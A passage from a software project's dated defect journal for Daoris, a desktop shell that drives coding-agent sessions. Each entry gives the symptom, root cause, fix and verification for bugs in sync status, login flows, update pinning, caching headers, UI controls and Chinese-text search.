**Verify.** The off test failed with a blank trigger before the page's fix. The module test failed
on the old null. On the window, the row shows "Off — declarations only" and offers the one agent the
machine has. The trap: **over this bridge, a null and an absent field are the same thing.**
Detecting an older shell by absence needs a value that is never null.

## The attention band missed an ask until a reload: a quiet tick never told the page (2026-09-24)

**Symptom.** With INT4d merged, an ask made over HTTP while the window was open did not appear in
*What needs you*. Its parked intake showed as a bare "parked at a checkpoint" session. A reload
showed both correctly.

**Root cause.** On the desktop the page is live only through the tick push. The shell forwards a
tick when it planned something, had events, or its considerations changed. It refetches sessions,
quests, the driver, sync and the index, but not asks. With the intake off, the tick never reads asks,
so an ask made by the other door changed nothing the tick reported. The band reads asks beside
sessions, so the sessions were fresher than the asks, and the parked intake could not find the ask
it belonged to.

**Fix.** `Asks.Signature` sits beside `Considerations.Signature`. The shell reads the asks each tick
and forwards the tick when they change, and the page refetches the asks on every tick it receives.

**Verify.** `AskSignatureTests` and the tick test failed first. On the window, an ask posted with
the page open appeared in the band with no reload.

## A gate declared and in the workflow was still red for a day: nothing a session runs ran it (2026-09-24)

**Symptom.** MAP3c ran `daoris-devkit verify --universal-only` and the sensitive gate was red. It
flagged placeholder home paths in six test fixtures, which four landings on 2026-09-23 had added.

**Root cause.** The universal gates ran in exactly one place, the release workflow, and that is
dispatched by hand. The workflow's comment claimed the private half also ran "locally and in the
pre-commit hook". No hook was ever installed, because DEVKIT3 left that to the owner. The dogfood test
held *the declared set* and *the workflow* in agreement. The list a session actually runs before
committing, `npm run verify`, was never part of that agreement. Three of the fixtures were
`D:/home/…`, meaning the Daoris home rather than a Unix home, and the pattern cannot tell the
difference.

**Fix.** The fixtures use `C:/somewhere/…`. `npm run verify` runs `verify --universal-only
--allow-builtins-only` last. The flag only matters when the private list is absent, so locally all
15 patterns run. A dogfood test holds the declared universal row inside `verify`. The workflow
comment says what is true.

**Verify.** The new dogfood test failed first, naming the missing row. With the fix, `npm run
verify` is green with `sensitive 15 patterns, nothing found`. With one fixture restored to
its old Unix-home placeholder, it exits 1 naming the file. This entry was the next thing the gate
caught: its first draft quoted that placeholder.

## A red test for a verb that installs ran the real installer (2026-09-24)

**Symptom.** While AGT2b's tests were being watched fail, `_fixtures/` grew by about 0.9 GB: three
real `npm install --prefix` runs, Claude Code 2.1.87 once and Codex 0.156.1 twice.

**Root cause.** TDD's red phase drove `agent pin claude-code|codex` through the dispatcher before the
channel route existed. The OLD route took the call and did its job, which was to spawn npm's
installer, so a unit test reached the registry. A failing test for a verb that spawns an installer
does not fail by asserting. It fails by running the installer.

**Fix.** The channel route now takes those two agents, and every channel test hands in its own
fetcher. The installs were deleted. The packages are still in the machine's npm cache, which is the
installer's and not the repository's. Before watching such a test fail, stub the spawn, or write the
test against the new seam so the red is a missing export rather than a live call.

**Verify.** CLI 379/379 in the worktree with no npm process started; 382 once integrated.

## The sync item said "synced" while the sync was failing: a wall stopped the pass before its record (2026-09-24)

**Symptom.** Found by looking at the real window while building SYNC6b, with a throwaway remote
wired into the scratch machine and then stopped. *Sync now* toasted the wall, while the status bar
went on saying `synced` and the circle's standing showed no new try.

**Root cause.** A driver pass runs the feed first (registrations, knowledge, retires, the team's
rows) and then asks its host for the quest pass. `QuestSync` records every try, and the standing
is read from that record (SYNC6a). `RemoteSync.RunOnceAsync` wrapped both halves in one `try`, so
the first wall (the feed's GET of the remote's registry) returned before the host was asked. The
host never tried, so nothing recorded the wall, and the standing kept its last success. A second
cause hid the first on a machine that joins nothing, the scratch family's case. The pass returned
early for a circle with nothing joined, so the host was never asked there either, and `sync now`
answered Clean without contacting anyone. That contradicts design §6, which gives every wired
circle a pass.

**Fix.** The feed's wall is caught on its own, and the host's pass runs whatever the feed met. The
problem is the first wall, named once. Every wired circle gets its pass. The bar says `unreachable`
beside the cloud-off glyph, since a glyph alone is not a sentence. The detail's lead-in says only
*when*, because the host's sentence already says what went wrong: "did not reach the remote: the
remote could not be reached" read twice on the window.

**Verify.** `A_wall_in_the_feed_still_asks_the_host_for_its_pass` fails against the single `try`
and passes with the fix. `A_wired_circle_with_nothing_joined_feeds_nothing_and_still_hears_the_team`
replaces the test that pinned the early return. On the window, a stopped remote showed
`unreachable` and the wall, and *Sync now* after it came back said `default synced.` with the bar
level again.

## A repository with no code map drew nothing at all: the host leaves nulls out (2026-09-23)

**Symptom.** Found by the browser gate before the change landed. Opening the code map of a
repository that keeps none showed the header and nothing else: no empty state, no map, no sentence.

**Root cause.** The host serializes with `DefaultIgnoreCondition = WhenWritingNull`
(`Daoris.Service.Http/Program.cs`), so a null field is **absent** from its answer, not `null`. The
page's type said `file: string | null` and the view tested `answer.file === null`, which is false for
`undefined`. The unit test's stub sent an explicit `null`, so it agreed with the type and not with
the host. Every other optional field in `api.ts` is already `?:` for this reason, and nothing said
why.

**Fix.** `CodeMapAnswer.file` and `problem` are `?: string | null`, and the view tests `!answer.file`.
The comment on the type says the host omits nulls.

**Verify.** The view test answers as the host does, with the fields left out. It failed with the
`=== null` comparison put back, one test red, and passes with the fix. The browser gate opens the
game's missing map over the real host (18/18).

**Commit.** `5f7ecf0`

## A door ran in its own accounts, not the agent's it declares (2026-09-23)

**Symptom.** Found by reading while designing API-key accounts, not by a person. An account made
for Claude Code, whether by sign-in, by key, or as a default, never reached a session held over the
protocol door. `claude-code-acp` resolved its default under its own name, found none, and ran in the
tool's own home. A Codex account could never reach `codex-acp` at all: the driver carries no `codex`
adapter, so nothing ever made an account under the door's name that it could sign into.

**Root cause.** `accountOf` (ACP2) was declared as *the harness whose ACCOUNT this one runs as*, and
the page grouped a tool's doors on it (D66). But `HarnessRoster.SelectAsync` and `HarnessProbe`
resolved accounts, defaults and directories with the adapter's own name. The field was read for its
login refusal sentence and for grouping, never for the account itself. Tests asserted the door's
seam, `CLAUDE_CONFIG_DIR` set to *a* profile home, and none asserted *whose*.

**Fix.** `HarnessToolchain.Owner` (`ownerOf` in the CLI, twin rule 7). The selection resolves the
owner's default and directory. It asks the owner's login question and takes the owner's key
variable when this build carries the owner, and otherwise stays permissive (SES3). The probe lists
the owner's accounts, so one tool shows one list. Account actions on a door, from either twin, land
on the owner's accounts and say so. The door's pin stays its own, because it is a different package.

**Verify.** `DoorAccountTests` (driver): the owner's default and directory, a workspace's choice,
the owner's key variable, a refusal naming the owner's login, the roster's rows, an owner with no
adapter, and the pin still the door's. A module test and two CLI tests cover the account actions.

**Commit.** `09300bc`

## A pinned Claude Code could update itself out of its pin (2026-09-23)

**Symptom.** No run had moved one yet; the tool's own report said it could. Measured with no login
and no model: Claude Code 2.1.270, pinned into a scratch toolchain directory with the same
`npm install --prefix` TOOL2 uses, answered `claude doctor` with *Auto-updates: enabled*, channel
*latest*, and called itself an *npm-global* install, which a copy in Daoris's own folder is not.

**Root cause.** A pin was only a choice of file to run. Claude Code updates itself in the background
by default, on native and npm installs alike, and nothing Daoris spawned said otherwise. TOOL2
(D57) asserted the version it installed and never asked whether that version would stay. An update
from a copy that misreads its own install type would either move the pin or reach for an install
that is not the pin's.

**Fix.** A toolchain declares the environment a pinned binary runs with (`PinnedEnvironment`, and
`pinnedEnv` in the CLI twin). For `claude-code` that is `DISABLE_UPDATES=1`, which blocks every
update path; `DISABLE_AUTOUPDATER` stops only the background check. `HarnessProbe.Apply` sets it
whenever the binary is the managed one, which covers the pipe door's sessions and chats. On the ACP
door, `ClaudeAcp.PointAtClaude` sets it beside `CLAUDE_CODE_EXECUTABLE`, because the SDK runs that
`claude` with the adapter's environment. The probe asks a pinned binary with the same switch. A
binary off `PATH` gains nothing: its updates are the machine's (D48 §2a).

**Verify.** The same pinned copy with `DISABLE_UPDATES=1`: *Auto-updates: disabled (set by env:
DISABLE_UPDATES)*, `claude update` refused, still 2.1.270. `PinnedUpdatesTests` (driver) and the
CLI's pinned-probe test hold both doors, the probe, and the untouched `PATH` case.

**Commit.** `2a41c05`

## INT5 landed with the desktop's palette test red (2026-09-23)

**Symptom.** Running the modules suite for INT4a failed
`ChromePaletteTests.EveryCopiedTokenMatchesTheStylesheet` in both themes. The previous commit
(`daf2a03`, INT5) had claimed *modules 96* in its message.

**Root cause.** Two things. First, the look at the composer in INT5 found a light scrollbar in dark,
and the fix added a new `:root` block to `tokens.css`, **ahead** of the light one. The shell's native
chrome copies the tokens, and its test reads the first `:root` as light and the second as dark, so
a third block ahead of both shifted everything. Second, and the real cause: that edit came **after**
INT5's modules run. The vitest suite and the deployment rehearsal were re-run, and the one suite
that reads `tokens.css` from C# was not. The commit message reported a count from a run that
predated its last change.

**Fix.** The two properties live inside the existing light `:root`. A comment at the top of the file
names the one-light-one-dark rule and the test that reads it.

**Verify.** Modules 96 again; vitest 534. The rule the second cause breaks is older than this entry:
a gate count in a commit message is for the tree as committed, so every suite a late edit can reach
is re-run after that edit.

**Commit.** `21e1c2b`

## Two sessions in one repository broke every driver tick (2026-09-23)

**Symptom.** Found by reading, not by a person: mapping the conversation plumbing for the intake
turned up `Planner.cs` building `snapshot.Active.ToDictionary(s => s.Repository, …)`. A test with
two active sessions in one repository threw `ArgumentException: An item with the same key has
already been added. Key: Game`. A person holding a conversation in a checkout while a second runs in
a tree of its own would see the driver fail on every tick, and start nothing, for as long as both
were open.

**Root cause.** A regression by composition. The planner's dictionary (`a9c9e9a`, DRV2) was written
when the ledger allowed one active session per repository, so the key was unique by construction.
SURF2 (`8d695bb`, D51) moved the lock onto the **tree**, and two active sessions in one repository
became legal, but nothing revisited the planner's assumption. The family rehearsal creates exactly
that state (section 14, through the ledger) and never ticks the driver while it stands, so no gate
reached it.

**Fix.** `Planner.Plan` groups the active sessions by repository before keying them. Either blocks the
repository, and the first is the one the reason names.

**Verify.** `PlannerTests`, *two active sessions in one repository block it rather than break the
tick*: failed with the exception above before the fix, passes after. Driver 357.

**Commit.** `21e1c2b`

## "Send it back as a quest" opened no composer (2026-09-23)

**Symptom.** Found by a test, then seen on the window. The first unit test to hand `QuestsView` an
`opening` draft *the way `App` holds one* (a parent `useState`, cleared by `onOpened`) failed with
React's *"Too many re-renders"*. On the scratch shell, SURF6b's review act *send it back…* switched
the window to Quests and **opened nothing**: no composer, no draft, and no error anywhere a person
could see. The draft the door exists to carry was silently lost.

**Root cause.** The composer consumed the draft **during render**: `if (opening) { setDraft(…);
setComposing(true); onOpened?.(); }`. A state update during render makes React re-run that
component *at once, with the same props*, before the parent's update (the `onOpened` clear) can
land, so every pass saw the draft still there and set it again. `setDraft` is handed a new object
each time, so there was never a pass on which nothing changed. A test's render gives up loudly.
The window's ends with the parent's clear winning and the composer closed; exactly how React
resolved it there was not traced, and both outcomes come from consuming an event during render. The line has been
there since the door arrived (`5f959b7`, SURF6b), and no test held `opening` at all, so the
composer's own tests passed on a path that was never taken.

**Fix.** `QuestsView.tsx`: the draft is consumed by **identity**, React's pattern for adjusting
state when a prop changes: remember the last `opening` seen, and act only on a new one. The parent
is told from an effect, because updating another component during this one's render is its own
warning. The test file holds the view through `Held`, a holder shaped like `App`'s. **The same
shape was in `WorkFrame`**: the palette's *start a session* and *review* arrive as `intent`, and
were consumed the same way. A test holding it like `App` failed with the same loop before the fix,
and the same fix, plus forgetting a cleared intent so asking twice still counts, passes it. On the
scratch shell after the fix, Ctrl+K → *Start a session…* lands in Work with the form open. What the
palette did on the window before the fix was not looked at; the test is the evidence there. The
rule is in `docs/2026-09-19-frontend-architecture.md` §4b.

**Verify.** `QuestsView.test.tsx`, *a draft handed in by a door opens the composer on it, once*,
which proves the draft landed by the publish button coming enabled (it needs both repositories).
The four compose tests that drive the composer through a draft failed with the loop before the fix
and pass after it. On the scratch shell (`npm run desktop`), Work → Review → *send it back…* was
pressed with the old code rebuilt, and no dialog opened. With the fix rebuilt, the composer opened
with `from` set to the session's repository. The window swallowed the failure that the test made
loud, which is why nothing had reported it.

**Commit.** `e11100a`

## A login from the Machine view could never finish (2026-09-23)

**Symptom.** Pressing *Log in* on an account opened a browser and then nothing: the row kept
reading *not logged in*, the output under the door (a card below the button) showed the sign-in
link twice around a scatter of `]8;;`, and every control on the page stayed disabled until the
window was closed (owner: *"the ui for login claude, during and after include the entire login
workflow itself need better ui/ux"*).

**Root cause.** Four, found by running the harness's login with no console attached and then on
the installed shell. The flow Claude Code takes when its stdin is not a terminal is the *paste the
code* flow: it prints the link and `Paste code here if prompted >` and waits on stdin — which the
action never redirected, so nothing could answer it and the process waited for ever. The prompt has
no newline, and the pump delivered whole lines only, so the one line the person had to answer never
reached the page. The link is written as a terminal hyperlink escape (OSC 8), which a console well
renders literally. And the request that started the login **waited for it**: the bridge times a
request out at thirty seconds, a login waits on a person for minutes, so the page's call failed
while the process ran on — the panel closed, the row said nothing had changed, and a `claude auth
login` was left waiting for a browser nobody was told about (measured: the process was still alive
after the page had given up).

**Fix.** `HarnessActions.RunAsync` redirects stdin and hands a `HarnessRun` (send a line, cancel)
to whoever asked; `PumpAsync` delivers a partial line once the stream has been quiet for 250ms;
`Clean` strips OSC, CSI and lone escapes. `DriverModule` answers a process action once it has
**started** and announces its end as `HARNESS_ENDED` (the shape a conversation's ending already
took, D49 §3), keeps the running action by `harness:action`, and answers `HARNESS_INPUT` and
`HARNESS_CANCEL`, refusing both naming the action when nothing runs. The page's `SignIn` sits on
the account row with the three steps — the link with a copy button, the code box once asked, the
row's own pill as the result — hears the end as news, and keeps the tool's output one disclosure
away.

**Verify.** `HarnessRunTests` drives a node stand-in through the prompt-without-newline, the answer
and the cancel; `SignIn.test.tsx` the steps over a mocked bridge. On the installed shell, a
throwaway profile's sign-in streamed onto its row and **completed in the browser with no code
asked** — with a stdin present the harness takes its callback flow and prints only *Opening
browser…* — so the first step now says the browser was opened rather than waiting for a link that
never comes; the profile was forgotten afterwards. The paste-the-code path is held by the tests.

**Commit.** `84c4111`

## The deployed shell flashed a console window on every tick (2026-09-23)

**Symptom.** With the installed application running, a terminal window kept appearing and vanishing
on the desktop (owner: *"a console window keep popup up"*). Nothing in the workspace dev loop showed
it.

**Root cause.** The shell is a windowed process with no console, and a console child of such a
process is given a console of its own unless the spawn sets `CreateNoWindow`. Four spawn sites did
not: the session shell in `Adapters.cs`, the harness probe and the harness action in `Harnesses.cs`,
and git in `WorkingTree.cs`. The host supervisor and the hook processes did, which is why the
loop's own children never showed — but git runs every tick and the probes on every roster refresh,
each one flashing a window. Invisible from the workspace because `desktop.mjs run` starts the shell
from a terminal, whose console every child inherits.

**Fix.** `CreateNoWindow = true` at all four sites, and `NoConsoleWindowTests` in the driver's tests
scans every `new ProcessStartInfo` under the desktop's projects for it — the property belongs to every
spawn and the next site written will not know to.

**Verify.** The scan failed on the four sites before the fix and passes after; the installed shell
republished and run with the loop ticking, no window.

**Commit.** `f11a3d4`

## The rehearsal's ACP stub hung the driver on its second quest (2026-09-23)

**Symptom.** The family rehearsal's new plugin phase (D64) drove a second quest over the ACP stub
agent, and the driver sat until the gate's 90-second kill with the session record left `working`.
The transcript ended at *"handler failed: Command failed: git … commit"* and *"the ACP agent's
stream ended before it answered"*.

**Root cause.** Two, in the fixture. The stub wrote one fixed file with fixed content, so the
second session's tree had nothing to commit and `git commit` exited non-zero; and its
`session/prompt` handler let that exception escape, so the prompt was never answered — the driver
did what it should with an unanswered turn and waited on its own timeout. A turn that fails is
still a turn, and a harness that crashes mid-turn exits; a stub that neither answered nor exited was
a hang dressed as a session. It never showed while one quest a run rode the door.

**Fix.** `tools/family-rehearsal.mjs`: the stub writes `acp-answer-<quest>.md` and answers a failed
prompt with a JSON-RPC error, which the driver concludes as a failed session in seconds.

**Verify.** `npm run rehearse:family` 192/192, with phase 18's two quests both driven over the stub.

**Commit.** `77e1458`

## The testbed's own connector held every testbed quest (2026-09-23)

**Symptom.** After D63 moved the installed hosts under the Daoris home, `tools/testbed.mjs` was
re-run to re-point each testbed's `.mcp.json` — and the deployed shell then toasted *"held #… →
testbed-core: the working tree has uncommitted changes (1 paths) — somebody's work in progress"*
for every testbed. The driver was right: each tree was dirty. The one path was the connector.

**Root cause.** The script commits once, at birth (`README.md`, *"the starting point"*), and never
again: `init`, `sync`, the declaration and the connector are written afterwards and left for
somebody to commit. On the first build a driven session happened to land them with its own work;
on a re-run nothing did, so the file the script rewrote wholesale sat modified, and the driver's
clean-tree rule (D46) held the quest on the fixture's own wiring. A fixture that leaves the driver's
precondition unmet on every re-run is a fixture that tests nothing after the first day.

**Fix.** `tools/testbed.mjs` commits what the run wrote, per repository: the set of paths dirty
after the run and not before, plus the files it writes wholesale every time (`.mcp.json`,
`.claude/settings.json`, `daoris.json`) whether or not an earlier run left them dirty — because
"dirty before" there is the previous run's, and the previous run was this script too. Anything
else dirty is somebody's and stays. The row says `(committed)` when it did.

**Verify.** Re-run against the deployed install: three `(committed)`, `git status --porcelain`
empty in all three testbeds, the last commit *"adopted, synced and wired by tools/testbed.mjs"*,
and no held toast on the next tick.

**Commit.** `fe41055`

## The account a person has was invisible, and Forget forgot nothing (2026-09-23)

**Symptom.** Owner: *"a lot ui/ux issue which does not allow to manage account easily"*. Exercised
on the deployed application: `claude-code` read **"No accounts — sessions run in this tool's own
configuration home"** to an owner who was logged in there; *Add an account* made a row with a name,
a *not logged in* pill and a *Log in* button, and nothing about the browser window about to open or
where its output would go; a work account for the work circle could be set from a terminal
(`daoris harness profile default … --workspace`) and not from the screen; the toast read
*"claude-code: harness.profile-add finished."*; and **Forget on the new account did nothing anyone
could see** — the row stayed, the directory stayed.

**Root cause.** Four. The roster reported named profiles only, never the tool's own home — the
account that exists before any is named. The page carried no workspace on `profile-default` and
the payload carried no per-circle defaults, so the file's own shape (D49 §4) was invisible from
the screen. Three action names had no catalogue key. And "deletes nothing" was literal: a profile
is a directory, the roster lists directories, and Claude Code scaffolds a fresh home the first
time it is asked `auth status` — so a fresh account was never empty and never went away.

**Fix.** The probe asks the harness about its own home exactly as it asks each profile
(`HarnessReport.OwnLogin`); the roster leads with *this machine's own · logged in · sessions use
this*, and takes no login from here — that is the tool's own business and the row says so. A
logged-out row says what *Log in* will do. Each row offers *use for a workspace…* over the circles
this machine has, the payload carries `workspaceDefaults`, and the row says *sessions in X use
this*; `profile-default` with no profile **clears** rather than refuses. Forget takes the
directory when there is nothing signed-in to destroy by the harness's own word — empty, or
reported signed out — and keeps it otherwise, saying which and where; the CLI's `profile remove`
draws the same line, and the family rehearsal holds both halves with the stub harness and `dsh`.

**Verify.** Driver, modules, CLI and roster tests, each seen red first. On the install: the own
row logged in; *work* added, its hint under it, Forget → row and directory gone.

**Commit.** `adeb520`

## The roster listed a fixture as a tool, and spoke the runtime's words (2026-09-23)

**Symptom.** The Machine view on the deployed application ended with an agent tool called `stub` —
*not installed*, an **install** button, *no command to run* — and `dsh`'s absence read *"`dsh` is
not on this machine's PATH — An error occurred trying to start process 'dsh' with working directory
'<the checkout>'. The system cannot find the file specified."*

**Root cause.** Two. The stub adapter declares a toolchain with **no binary of its own** — the
"binary" is whatever `driver.json` names, which is what lets the family rehearsal gate the roster
with no model — and the roster enumerated every adapter with a toolchain; a machine that names no
command got a fixture presented as a tool. And the probe appended the runtime's exception message to
its own sentence for every failure alike, including the one where the sentence already says
everything: file not found, plus a machine path the probe's working directory happened to be.

**Fix.** A door whose toolchain has no binary and for which no command is configured is not on the
roster (`HarnessRoster.RosterAsync`, structural, and the spawn path is untouched); name a command and
it is a door again. A `Win32Exception` with `ERROR_FILE_NOT_FOUND`/`ENOENT` keeps the sentence and
drops the message; any other start failure keeps the runtime's words, which are then news.

**Verify.** `HarnessTests` — the fixture door off the roster until a command names it, and the
absent-harness sentence exact — both seen red. On the install: no `stub` card, and `dsh`'s row
reading the one sentence.

**Commit.** `06e560b`

## A blue ✕ in a palette with no blue — the OS accent through a native control (2026-09-23)

**Symptom.** The Search field on the deployed application showed a blue ✕ at its right once a
query was typed, in both themes. Nothing in the platform is blue: D41's palette is ink, accent and
the validated status hues, and `tokens.test.ts` holds every size to a named step — colour was not
being watched the same way.

**Root cause.** `<input type="search">` brings Chromium's native clear button, and WebView2 paints
it with the **Windows accent colour** — the person's system setting, not a token. A browser test
cannot see it (jsdom draws nothing), and Playwright's Chromium paints it grey, so it was invisible
until a screenshot of the real window.

**Fix.** The native button and decoration are hidden (`tokens.css`, `-webkit-appearance: none`),
the field keeps its type, and `SearchView` draws its own clearing control in the platform's
language — a ghost button that exists only while there is something to clear.

**Verify.** `SearchView.test.tsx` (seen red without the control). On the install, in both themes:
the field with a query shows the platform's ✕ and nothing of the accent.

**The trap to inherit.** 🔴 **A native form control carries the OS accent into the page.** Any
`type="search"`, `<select>`, checkbox or range left native is painted by the system, in the system's
colour; the platform draws its own (D41 §4), and this one had been missed.

**Commit.** `92afb48`

## One result, zero marks — the marker cut 中文 differently from the index (2026-09-23)

**Symptom.** Searching `会话记录` on the deployed application: one result, correctly — a body that
says `会话的记录` — and nothing marked in its excerpt, though marking the matched term is the whole
reason the excerpt is shown.

**Root cause.** The index matches a run of ideographs by its overlapping bigrams (`会话 话记 记录`,
the 中文 search fix of the same day); the marker looked for the query as it was typed, one
four-character term, which the body does not contain. Two halves of one rule cut two ways — the
same shape as the tokeniser's floor, found the same day, in the other direction.

**Fix.** `termsOf` cuts a run of ideographs into its bigrams before marking (`highlight.ts`,
`cut`), a lone ideograph staying one unit and everything else whole — `Text.Segment`'s rule, in the
marker's language.

**Verify.** `highlight.test.ts`: `会话记录` → `会话 话记 记录`, and the body `会话的记录在此` marked as
`会话` · 的 · `记录` · 在此 — both seen red. On the install, the same search: one result, the two
words marked in its excerpt.

**Commit.** `fbfa609`

## The drawer's close button was under the window's own (2026-09-23)

**Symptom.** In a quest drawer on the deployed application, the header's × was not there: a sliver
of a button showed beneath the window's caption buttons, and the rest was hidden. ESC and the
scrim still closed the drawer; the control the header carries for it did not exist to a person.

**Root cause.** The app strip is the window's title bar (D56), and the three caption slots in it
are painted by the **window**, over the page. The scrim learned this on 2026-09-22 (`top-9`, held
by `tokens.test.ts`); the panel beside it did not, and stayed `fixed inset-y-0` — so its header sat
in the strip, under the buttons the page does not draw. Invisible in every browser test, because
a browser has no caption to hide behind; visible in one screenshot.

**Fix.** The drawer starts at `top-9`, like the scrim (`ui.tsx`). The rule is now held for every
panel, not only every scrim: `panelsOverTheStrip` in `tokens.test.ts`, seen red on the drawer's
own class list.

**Verify.** The tokens test, red then green. On the install: the quest drawer's header sits below
the strip with its × visible and the caption buttons beside it, not over it.

**Commit.** `57281d2`

## The Overview asked whether anything was sitting, and never said why (2026-09-23)

**Symptom.** On the deployed application with one open quest held on the trust flag: the Overview's
outstanding row read *pill · title · route · filed 8h ago* and nothing else, and the only place the
reason appeared was a toast — three of them, as the hold's reason flapped — gone in seconds. A person
looking at the row had no way to learn that this machine's driver had looked at the quest every ten
seconds and declined to start it, or why.

**Root cause.** Three halves. The driver has said why every open quest is sitting since D46 §3
(*"sitting must always say why"* — `Consideration.Reason`), and the shell forwarded it in every tick
as `considered`; the page read the tick's `events` and dropped the rest. The loop forwarded a tick
only when it had events or a planned start — so a quest sitting *silently* (not drivable here, no
root, at capacity) never reached the page at all, on any tick. And the holds a real machine actually
hits — a dirty tree, a logged-out harness, a tree that would not grow, a trust flag never given —
are decided at **spawn**, after the planner said `Start`; the report kept the plan, so the quest
this machine held every fifteen seconds read `Start` in every consideration. The first build of
this fix shipped the page's half, republished, and showed nothing under the row: that is how the
third half was found.

**Fix.** A spawn-time hold becomes the quest's verdict in the report — `StartVerdict.Blocked`, the
hold's own sentence as the reason (`Considerations.Blocked`; the plan itself is untouched). The tick
writes `considered` to its own query key (`keys.considered`, never invalidated, never fetched);
`useConsidered` reads it; the Overview row carries *sitting — <reason>* truncated with the whole
sentence in its tip, and the quest drawer carries it whole. The loop forwards a tick when the
considerations' **signature** changes (`Considerations.Signature`, order-free), so a stable sitting
set costs nothing and a change always arrives. A `Start` verdict is not sitting.

**Verify.** `sittingBecause`, the signature helper and the blocked fold-in, each seen red first;
the shell test seen red against the previous Overview (the sentence never rendered). On the
deployed application: the row under `#7786da` reads the driver's trust-flag sentence, and stays.

**Commit.** `9a6390c`

## A page seen once from a stale host was the page on every start after (2026-09-23)

**Symptom.** With the host precedence fixed and the install demonstrably running its own host, the
window still loaded `index-CeYefnb-.js` — a bundle that host does not have (its `/assets/` answers
404 for it). `performance.getEntriesByType('navigation')` in the live page: `deliveryType: cache`,
`transferSize: 0` — for the page, its script and its stylesheet.

**Root cause.** The HTTP host serves `wwwroot` with `ETag` and `Last-Modified` and **no
`Cache-Control`**, so the browser applies heuristic freshness to `index.html` and reuses it without
asking. The one time the window loaded a page from the machine's older host (adopting it, the
minute before), the WebView2 profile under `data/` kept that `index.html` **and the bundle it
named**, and every later start was answered from there — a stale page with no request ever reaching
the correct host. The hashed assets are the right thing to cache forever; the unhashed page that
names them is the one thing that must never be reused without revalidation, and it was the one
thing with no instruction at all.

**Fix.** `Program.cs` (local mode): `/assets/*` is `public, max-age=31536000, immutable` — a
hashed name is a promise — and everything else, the page above all, is `no-cache`, which with the
ETag the host already sends is one conditional request and a 304 per start.

**Verify.** The deployment rehearsal's phase 3 asserts both headers on the published host — seen
red against the previous host (`cache-control: (none)`, 32/34), green after (34/34). On the deployed
application, republished and started twice: the first start fetched the page from the network
(775 B, 200); the second made a conditional request (300 B — the ETag exchange) before reusing the
body, while the hashed bundle and stylesheet were reused at 0 B. Blind reuse is the `0 B` the
symptom showed on the page itself, and it no longer happens to the page.

**The trap to inherit.** 🔴 **A page that names hashed assets is itself unhashed, and it is the
page that decides what the window runs.** Every other fix in this area — the precedence, the
adoption notice — reaches the browser through this file, and none of them can be seen while it is
served from a cache.

**Commit.** `94845c9`

## The deployed shell ran the machine's older host, not the one published with it (2026-09-23)

**Symptom.** `npm run publish:desktop -- --to <install> --service`, then start the install: the
window showed the **previous** page. `performance.getEntries()` in the live page named a bundle
(`index-CeYefnb-.js`) that existed nowhere on disk except under `~/.daoris/bin`; the install's own
`wwwroot` held the new one, and the host answering on 5177 served a 404 for it. The host process
was the shell's child and its path was `~/.daoris/bin/daoris-knowledge-http/` — not
`<install>/app/daoris-knowledge-http/`.

**Root cause.** `ServiceHostLocator` ranked the machine's installed home **above** the host beside
the shell, deliberately, with the reason written down: *one service, upgraded once for every shell
on it — a deployed copy outranking it would make a service upgrade invisible*. The second
deployment produced the inverse: the **desktop** upgrade was invisible, because the install's own
upgrade path (`publish:desktop --service`, one command, both halves) lands beside the shell and the
shell was not looking there first. The first deployment's 4d was the same class through a different
door (adopting a host already *running*); this one spawned the wrong host with nothing running.

🔴 **The deployment gate said so and passed.** Its header listed *"`~/.daoris/bin` outranks the
install"* under *what this gate cannot control*, and phase 4 asserted only that the host was *not
this workspace's build* — which the machine's host satisfied — while printing
`located: ~/.daoris/bin/…` in every transcript. 32/32, with the wrong host named on line 33.

**Fix.** The order is now *what the person said → what the install carries → the machine's
installed home → the workspace build* (`ServiceHostLocator.cs`); a shell published without
`--service` still falls through to the machine's home. Phase 4 of the rehearsal asserts the started
host is the one **under the install** — on a machine that ran `publish:service --install` the
machine's copy is the decoy, and on a clean machine the check is the same as before.

**Verify.** `ServiceHostLocatorTests` — two tests seen red on the old order. `npm run
rehearse:deploy` seen red at phase 4 on this machine with the strengthened check and the old order,
then green with the new. On the deployed application: `document.scripts` names the bundle the
install's `index.html` names, and the Projects page renders this commit's sentences.

**The trap to inherit.** 🔴 **"What this gate cannot control" is a list of things the gate is
wrong about until proven otherwise.** A stated limitation that names the exact defect is a check
waiting to be written, and the line that names the machine's host in every transcript was the
evidence nobody read.

**Commit.** `48b0deb`

## The tokeniser's separators were a list, and 中文 punctuation was not on it (2026-09-23)

**Symptom.** `D51：会话` tokenised to `d51：` and `会话` — a term with a fullwidth colon glued to it,
which no index row has ever held. The service's own excerpt could not find it, and convergence
counted `d51：` and `d51` as two words. Small, and the same shape as the 中文 search defect two
entries below: a Latin assumption in a place that had just been taught the other language.

**Root cause.** `Text.Separators` was a hand-listed ASCII string. Any list of characters is wrong
the first time text arrives with a character not on it, and the file's own header already said so
about the *three* lists it replaced — one list is the same failure with a smaller surface. FTS5's
`unicode61` never had the problem: its rule is *a letter or a digit is a word character; everything
else separates*, in any script.

**Fix.** `Text.Tokenize` splits by that rule (`char.IsLetterOrDigit`) instead of a list — hyphen and
underscore still separate, as the header's own example needs. The platform's `termsOf` already
splits on `[^\p{L}\p{N}_-]`, so the two agree on punctuation; its deliberate difference (a
hyphenated term marks as one) is held by its own test.

**Verify.** `TextTests.Tokenize_separates_on_fullwidth_punctuation_as_it_does_on_ascii`, seen red on
the list (`["d51：", "会话"]`) and green on the rule. 275 service tests.

**Commit.** `99eda22`

## The Projects page said "nothing indexed" three ways (2026-09-23)

**Symptom.** On the deployed family of twenty registrations, a repository present in the index with
a count of zero read *"0 entries · 0 local · 0 canonical"*; one the index had never seen read
*"nothing indexed yet"*; one outside the family read *"—"*. Three renderings of one fact, on one
page, and the first of them looked like a measurement.

**Root cause.** Two branches decided by two different tests — `counts` present, then `total > 0` —
written at different times against a fixture in which every repository had entries. The fixture
cannot show a vocabulary drift, because it has one repository.

**Fix.** `ProjectsView.tsx`: both cards render `projects.nothingIndexed` for *absent or zero*, and
the count sentence only for a count above zero.

**Verify.** A shell test with the three cases side by side, seen red (one sentence of three) before
the change. 483 web unit tests.

**Commit.** `99eda22`

## The status bar counted a rebuild half-fed, and kept the number (2026-09-23)

**Symptom.** After the index's schema bump, the deployed application's status bar read
*"555 entries · 7 repositories"* — and stayed there — on an index that held 1,050 across 17. Neither
the old count nor the new one: a number nothing else on the machine agreed with.

**Root cause.** A schema mismatch drops the index and the next refresh re-feeds it, repository by
repository, over several seconds — so the rebuild is **observable**, and the page happened to ask for
the summary seven repositories in. That is fine; what is not is that the answer was then cached
